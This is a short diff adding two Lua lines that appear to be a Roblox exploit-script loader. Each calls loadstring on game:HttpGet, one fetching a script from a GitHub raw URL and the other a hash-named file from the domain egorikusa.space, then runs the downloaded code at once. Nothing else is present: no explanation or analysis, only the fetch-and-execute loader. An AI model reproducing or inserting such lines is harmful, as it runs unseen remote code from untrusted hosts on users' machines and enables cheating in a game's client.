@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/proplayer123-z/overdrive-h/refs/heads/main/odh.lua"))()
+
+loadstring(game:HttpGet("https://egorikusa.space/f943aa785660d25c9eded1ab.lua", true))()
